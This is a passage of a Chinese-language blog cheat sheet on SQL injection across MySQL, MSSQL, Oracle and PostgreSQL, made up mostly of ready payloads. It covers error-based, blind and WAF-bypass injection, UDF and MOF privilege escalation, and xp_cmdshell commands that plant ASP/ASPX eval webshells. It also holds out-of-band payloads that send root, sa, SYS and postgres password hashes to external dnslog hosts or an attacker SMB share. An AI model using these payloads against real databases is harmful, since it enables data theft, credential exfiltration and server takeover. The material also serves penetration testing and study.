+检测union select注入
+order by 查列数
+union select 看回显
+
+用
+or 1=1
+or 1=2
+and 1=1
+and 1=2
+检测boolean注入
+
+用
+or sleep(3)
+检测time_base注入</code></pre><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><pre><code>Mysql 默认端口 3306</code></pre><h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2><h3 id="Union-Select注入"><a href="#Union-Select注入" class="headerlink" title="Union Select注入"></a>Union Select注入</h3><pre><code class="mysql">确认列数
+order by 
+union select 1,2,3
+union select null,null,null
+union select @,@,@</code></pre>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><pre><code class="mysql">1. floor + rand + group by
+select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));
+2. ExtractValue
+select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+3. UpdateXml
+select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));
+4. Name_Const(&gt;5.0.12)
+select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;
+5. Join
+select * from(select * from mysql.user a join mysql.user b)c;
+select * from(select * from mysql.user a join mysql.user b using(Host))c;
+select * from(select * from mysql.user a join mysql.user b using(Host,User))c;
+6. exp()//mysql5.7貌似不能用
+select * from user where id=1 and Exp(~(select * from (select version())a));
+7. geometrycollection()//mysql5.7貌似不能用
+select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+8. multipoint()//mysql5.7貌似不能用
+select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));
+9. polygon()//mysql5.7貌似不能用
+select * from user where id=1 and polygon((select * from(select * from(select user())a)b));
+10. multipolygon()//mysql5.7貌似不能用
+select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));
+11. linestring()//mysql5.7貌似不能用
+select * from user where id=1 and linestring((select * from(select * from(select user())a)b));
+12. multilinestring()//mysql5.7貌似不能用
+select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></pre>
+<h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><ul>
+<li><p>bool注入</p>
+<pre><code class="mysql">and 1=1
+and 1=2
+or 1=1
+or 1=2
+爆数据长度
+and length(查询数据语句)=数字
+select * from user where id=1 and length((select version()))=23;
+爆数据
+and mid((查询数据语句),数字,1)=&#39;字符&#39;
+select * from user where id=1 and mid((select version()),1,1)=&#39;5&#39;;</code></pre>
+</li>
+<li><p>时间盲注</p>
+<pre><code class="mysql">sleep()
+benchmark()
+爆数据长度
+and if(length(查询数据语句)=数字,sleep(5),0)
+and if(length(查询数据语句)=数字,BENCHMARK(10000000, md5(1)),0)
+爆数据
+and if(mid((查询数据语句),数字,1)=&#39;字符&#39;,sleep(5),0)
+and if(mid((查询数据语句),数字,1)=&#39;字符&#39;,BENCHMARK(10000000, md5(1)),0)
+其他操作。。</code></pre>
+</li>
+<li><p>dnslog注入</p>
+<pre><code class="mysql">select load_file(concat(&#39;\\\\foo.&#39;,(select mid(version(),1,1)),&#39;.attack.com\\&#39;));
+SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.mysql.ip.port.b182oj.ceye.io\\abc&#39;));</code></pre>
+</li>
+<li><p>SMB</p>
+<pre><code class="mysql">&#39; or 1=1 into outfile &#39;\\\\attacker\\SMBshare\\output.txt&#39;</code></pre>
+</li>
+</ul>
+<h3 id="小众注入位置"><a href="#小众注入位置" class="headerlink" title="小众注入位置"></a>小众注入位置</h3><ul>
+<li><p>limit 后面//貌似mysql5.7不能用</p>
+<pre><code class="mysql">ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
+ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre>
+</li>
+<li><p>order by后面</p>
+<pre><code class="mysql">通过条件+排序
+order by IF(1=1,name,price) 通过name字段排序
+order by (CASE+WHEN+(1=1)+THEN+name+ELSE+price+END)
+通过报错
+select host from mysql.user order by host|updatexml(1,concat(0x3a,version(),0x3a),1);
+select host from mysql.user order by host|extractvalue(1,concat(0x7e,version()));
+</code></pre>
+</li>
+<li><p>like 模糊匹配</p>
+<pre><code class="mysql">like &#39;%test%&#39;</code></pre>
+</li>
+<li><p>regexp</p>
+<pre><code class="mysql">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &#39;^[a-n]&#39; limit 0,1); // true
+and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &#39;^[a-g]&#39; limit 0,1); //true
+and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &#39;^[a-a]&#39; limit 0,1);//false
+and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &#39;^a[a-n]&#39; limit 0,1);//true</code></pre>
+</li>
+</ul>
+<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><h4 id="最常用的获取数据方法"><a href="#最常用的获取数据方法" class="headerlink" title="最常用的获取数据方法"></a>最常用的获取数据方法</h4><p>大于Mysql 5.0</p>
+<pre><code class="mysql">获取库名
+select schema_name from information_schema.schemata limit 0,1
+获取表名
+select table_name from information_schema.tables where table_schema=&#39;mysql&#39; limit 0,1
+获取列名
+select column_name from information_schema.columns where table_schema= &#39;mysql&#39; and table_name = &#39;db&#39; limit 0,1
+获取数据
+select name from user; 
+注：可以用十六进制代替数据库名、表名</code></pre>
+<pre><code class="mysql">如果过滤了空格，linux下可以用下列字符替代
+%09 tab水平
+%0a 换行
+%0d    return 
+%0b tab垂直
+%a0 空格</code></pre>
+<h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><pre><code class="mysql">select database();
+select schema_name from information_schema.schemata limit 0,1;
+select group_concat(schema_name) from information_schema.schemata;
+select distinct(Db) from mysql.db;
+select distinct(database_name) from mysql.innodb_index_stats;//mysql&gt;5.6
+select distinct(database_name) from mysql.innodb_table_stats;//mysql&gt;5.6</code></pre>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><pre><code class="mysql">select table_name from information_schema.tables where table_schema=&#39;mysql&#39; limit 0,1
+select group_concat(table_name) from information_schema.tables where table_schema=&#39;mysql&#39; ;
+SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;
+select distinct(table_name) from mysql.innodb_index_stats;//mysql&gt;5.6
+select distinct(table_name) from mysql.innodb_table_stats;//mysql&gt;5.6</code></pre>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><pre><code class="mysql">select column_name from information_schema.columns where table_schema= &#39;mysql&#39; and table_name = &#39;db&#39; limit 0,1
+select group_concat(column_name) from information_schema.columns where table_schema= &#39;mysql&#39; and table_name = &#39;db&#39; </code></pre>
+<h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><pre><code class="mysql">Select group_concat(column_name) from table_name</code></pre>
+<h2 id="双注入Double-Injection"><a href="#双注入Double-Injection" class="headerlink" title="双注入Double Injection"></a>双注入Double Injection</h2><blockquote>
+<p>原理：mysql在 group by时，会先建立一张虚拟表。<br>取第一条记录，执行 floor(rand(0)<em>2)，发现结果为0，查询虚拟表，发现0的键值不存在，则在虚拟表插入<br>的新的数据时 floor(rand(0)</em>2)会被再计算一次，结果为1（第二次计算）<br>取第二条记录，执行 floor(rand(0)<em>2)，发现结果为1（第三次计算），查询虚拟表，发现1的键值存在，所以<br>floor(rand(0)2)不会被计算第二次，直接count()加1，第二条记录查询完毕。<br>再次增加一条的时候<br>floor(rand(0)</em>2)发现结果为0（第4次计算）<br>查询虚拟表，发现0的键值不存在! 那么会在被计算一次<br>结果为1（第5次计算）<br>但是这个 已经存在了。主键值必须唯一。所以插入表就报错了。<br>返回的这个也是个表，每次查询处理计算完插入进去。<br>这样就可以报错了。</p>
+</blockquote>
+<pre><code class="mysql">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));
+union select 1,2 from (select+count(*),concat(floor(rand(0)*2),( 查询数据语句))a from information_schema.tables group by a)b</code></pre>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><pre><code class="mysql">select user, file_priv from mysql.user;//查看权限
+select * from users where id = ((&#39;1&#39;)) union select 1,2,load_file(&#39;/etc/passwd&#39;);//若是有权限，但不能读取，应该是secure_file_priv的锅</code></pre>
+<h2 id="输出到文件中-需要知道绝对路径"><a href="#输出到文件中-需要知道绝对路径" class="headerlink" title="输出到文件中(需要知道绝对路径)"></a>输出到文件中(需要知道绝对路径)</h2><pre><code class="mysql">select * from users where id = ((&#39;1&#39;)) union select 1,2,users() into outfile &#39;D:\\1.txt&#39;;///var/lib/mysql-files/2.txt
+select * from users where id = ((&#39;1&#39;)) union select 1,2,users() into dumpfile &#39;D:\\1.txt&#39;;
+outfile 导出可以多行，会有换行等，适合导出文本文件
+dumpfile 导出只能是一行，没有换行，适合导出二进制文件</code></pre>
+<h2 id="二次排序注入-存储型的注入"><a href="#二次排序注入-存储型的注入" class="headerlink" title="二次排序注入 (存储型的注入)"></a>二次排序注入 (存储型的注入)</h2><pre><code class="mysql">二次排序注入也称为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。
+二次排序注入思路：
+1. hacker输入的数据会经过转义代入sql语句中，然后，储存在数据库中，在数据库中的数据是没有转义的
+2. hacker进行别的操作，将数据库中的数据取出来（未转义）并用于拼接到另外一个sql语句中，这就可以绕过转义了。
+假设存在一个账户&quot;admin&quot;，密码不知
+创建一个账户&quot;admin&#39;#&quot;，则在数据库中保存有&quot;admin&#39;#&quot;
+修改密码的时候，代入sql语句
+update users set passwd = &quot;xxxx&quot; where username = &#39;      admin&#39;#    &#39; and passwd = &#39;xxxxxxx&#39;
+</code></pre>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><pre><code class="mysql">%df&#39;   -&gt;    %df%5c&#39;
+将sql语句解析为gbk编码时，
+%df%5c  -&gt;  当成一个字符，后面的&#39;逃逸出来了
+
+(1) mysql_query，如mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;, $conn)、mysql_query(&quot;setcharacter_set_client = gbk&quot;, $conn)。
+
+(2) mysql_set_charset，如mysql_set_charset(&quot;gbk&quot;,$conn)。
+
+(3) mb_convert_encoding，如mb_convert_encoding($sql,&quot;utf8&quot;,&quot;gbk&quot;)，将SQL语句从gbk格式转换为utf8格式时，0x5c被吃掉了。
+
+(4) iconv，如iconv(&#39;GBK&#39;, &#39;UTF-8&#39;,$sql)
+</code></pre>
+<h2 id="注入点-update-insert-delete"><a href="#注入点-update-insert-delete" class="headerlink" title="注入点 update / insert /delete"></a>注入点 update / insert /delete</h2><pre><code class="mysql">报错注入
+extractvalue()函数是MYSQL对XML文档数据进行查询函数。
+or extractvalue(1,concat(0x7e,version())) or
+
+updatexml()函数是MYSQL对XML文档数据进行修改的XPATH函数。
+or updatexml(1,concat(0x7e,(version())),0) or
+
+name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。
+or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or
+在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。
+
+update数据到可见参数
+update users set points =  1*(select conv(hex((select substr( pw ,1%s,1))),0b10000,0b10))</code></pre>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="过滤型"><a href="#过滤型" class="headerlink" title="过滤型"></a>过滤型</h3><h3 id="检测型"><a href="#检测型" class="headerlink" title="检测型"></a>检测型</h3><blockquote>
+<p>检测<code>select</code></p>
+<ol>
+<li>尝试大小写绕过</li>
+<li>尝试URLencode，如<code>%53elect</code></li>
+<li>仅能查询当前表</li>
+</ol>
+</blockquote>
+<h2 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h2><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>Windows</p>
+<pre><code>mysql &lt; 5.0 无路径限制
+如， C:\Winnt\udf.dll 或 C:\Windows\udf.dll
+5.0 &lt;= mysql &lt; 5.1 system目录
+如，C:\WINDOWS\udf.dll 或 C:\WINDOWS\system32\udf.dll 
+mysql &gt;= 5.1
+%mysql%\plugin\udf.dll
+select @@plugin_dir / show variables like &#39;%plugin%&#39;;查询plugin路径
+如，C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\udf.dll</code></pre><pre><code class="mysql">Create function cmdshell1 returns string soname &quot;udf.dll&quot;;
+Select cmdshell1(&quot;dir&quot;);
+# 用完后
+Drop function cmdshell1;</code></pre>
+<pre><code>常用函数名：
+cmdshell    执行cmd;
+downloader  下载者,到网上下载指定文件并保存到指定目录;
+open3389    通用开3389终端服务,可指定端口(不改端口无需重启);
+backshell   反弹Shell;
+ProcessView 枚举系统进程;
+KillProcess 终止指定进程;
+regread     读注册表;
+regwrite    写注册表;
+shut        关机,注销,重启;
+about       说明与帮助函数;</code></pre><p>Linux</p>
+<pre><code class="mysql">show variables like &quot;%plugin%&quot;;
+/usr/lib/mysql/plugin/lib_mysqludf_sys.so </code></pre>
+<pre><code class="mysql">CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+SELECT * FROM information_schema.routines
+sys_exec(id);</code></pre>
+<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><pre><code class="mysql">select load_file(&#39;C:\\www\\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</code></pre>
+<h1 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><pre><code>@@version&gt;0
+@@SERVERNAME
+
+
+爆数据库名
+db_name()&gt;0
+(SELECT top 1 Name FROM Master..SysDatabases)&gt;0
+(SELECT top 1 Name FROM Master..SysDatabases where name not in (&#39;master&#39;))&gt;0
+爆表名
+(select top 1 name from 数据库名.sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=0)&gt;0
+users
+(select top 1 name from 数据库名.sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=0 and name not in (&#39;users&#39;))&gt;0
+爆列名
+(select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME=&#39;表名&#39;)&gt;0
+(select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME=&#39;表名&#39; and COLUMN_NAME not in (&#39;列名&#39;))&gt;0
+爆数据
+(select top 1 列名 from 表名)&gt;0
+gxctf
+(select top 1 列名 from 表名 and 列名 not in (&#39;gxctf&#39;))&gt;0</code></pre><h2 id="输出到文件，上传木马"><a href="#输出到文件，上传木马" class="headerlink" title="输出到文件，上传木马"></a>输出到文件，上传木马</h2><pre><code>?id=1;exec master..xp_cmdshell &#39;echo &quot;&lt;%@ LANGUAGE=VBSCRIPT %&gt;;&lt;%eval request(chr(35))%&gt;&#39;&#39;&quot; &gt; d:\www\1.asp&#39;--
+
+?id=1;exec master..xp_cmdshell &#39;echo &quot;&lt;%@ LANGUAGE=Jscript %&gt;;&lt;%eval(Request(&quot;sb&quot;),&quot;unsafe&quot;)%&gt;&#39;&#39;&quot; &gt;C:\inetpub\wwwroot\2.aspx&#39; --
+</code></pre><h2 id="hex编码绕过waf"><a href="#hex编码绕过waf" class="headerlink" title="hex编码绕过waf"></a>hex编码绕过waf</h2><pre><code>1. 爆数据库版本：
+select convert(int,@@version) 
+hex编码后：0x73656c65637420636f6e7665727428696e742c404076657273696f6e29
+?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 eXeC(@s)--
+转换成数据类型 int 时失败。
+2. 爆当前数据库
+select convert(int,db_name()) 
+hex 编码后：
+0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929
+?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929 eXeC(@s)--
+3. 爆用户：
+select convert(int,User_Name())
+hex编码后：0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929
+?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929 eXeC(@s)--
+同理</code></pre><h2 id="boolean盲注"><a href="#boolean盲注" class="headerlink" title="boolean盲注"></a>boolean盲注</h2><pre><code>?c=c1&#39;/**/and/**/ascii(substring(@@version,1,1))&gt;0/**/--&amp;t=0
+?c=c1&#39;/**/and/**/ascii(substring(子查询,1,1))&gt;0/**/--&amp;t=0</code></pre><h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><pre><code>DECLARE @host varchar(1024);
+SELECT @host=(SELECT TOP 1
+master.dbo.fn_varbintohexstr(password_hash)
+FROM sys.sql_logins WHERE name=&#39;sa&#39;)
++&#39;.ip.port.b182oj.ceye.io&#39;;
+EXEC(&#39;master..xp_dirtree
+&quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);</code></pre><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><h2 id="dnslog注入-1"><a href="#dnslog注入-1" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><pre><code>SELECT UTL_INADDR.GET_HOST_ADDRESS(&#39;ip.port.b182oj.ceye.io&#39;);
+SELECT UTL_HTTP.REQUEST(&#39;http://ip.port.b182oj.ceye.io/oracle&#39;) FROM DUAL;
+SELECT HTTPURITYPE(&#39;http://ip.port.b182oj.ceye.io/oracle&#39;).GETCLOB() FROM DUAL;
+SELECT DBMS_LDAP.INIT((&#39;oracle.ip.port.b182oj.ceye.io&#39;,80) FROM DUAL;
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&#39;SYS&#39;)||&#39;.ip.port.b182oj.ceye.io&#39;,80) FROM DUAL;</code></pre><h1 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h1><pre><code>Postgresql 默认端口 5432</code></pre><p>Postgresql查询数据</p>
+<pre><code>SELECT datname FROM pg_database;
+select schema_name from information_schema.schemata limit 1 offset 0; # PostgreSQL &gt;= 7.4
+SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#39;r&#39;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#39;public&#39;)</code></pre><h2 id="dnslog注入-2"><a href="#dnslog注入-2" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><pre><code>DROP TABLE IF EXISTS table_output;
+CREATE TABLE table_output(content text);
+CREATE OR REPLACE FUNCTION temp_function()
+RETURNS VOID AS $
+DECLARE exec_cmd TEXT;
+DECLARE query_result TEXT;
+BEGIN
+SELECT INTO query_result (SELECT passwd
+FROM pg_shadow WHERE usename=&#39;postgres&#39;);
+exec_cmd := E&#39;COPY table_output(content)
+FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&#39;&#39;;
+EXECUTE exec_cmd;
+END;
+$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT temp_function();</code></pre><pre><code>information_schema特性支持
+Microsoft SQL Server - Supported in Version 7 and up
+MySQL - Supported in Version 5 and up
+PostgreSQL - Supported in Version 7.4 and up
+Oracle - Does not appear to be supported
+Apache Derby - NOT Supported As of Version 10.3</code></pre><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://raw.githubusercontent.com/UltramanGaia/SecMM/master/SQL%E6%B3%A8%E5%85%A5.png" alt=""></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
+        </span>
+    
+    ©2015-2020 UltramanGaia
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
